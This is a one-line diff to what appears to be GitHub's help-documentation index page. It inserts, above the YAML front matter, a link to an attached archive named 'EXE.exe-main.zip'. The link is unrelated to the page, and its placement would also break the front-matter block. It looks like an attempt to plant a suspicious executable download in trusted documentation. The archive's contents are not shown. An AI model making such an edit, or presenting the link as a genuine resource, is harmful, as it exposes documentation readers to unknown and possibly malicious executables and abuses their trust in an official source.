@@ -1,3 +1,4 @@
+[EXE.exe-main.zip](https://github.com/github/docs/files/6641435/EXE.exe-main.zip)
 ---
 title: '{% data variables.product.product_name %}{% if currentVersion == "free-pro-team@latest" %}.com{% endif %} Help Documentation'
 featuredLinks:
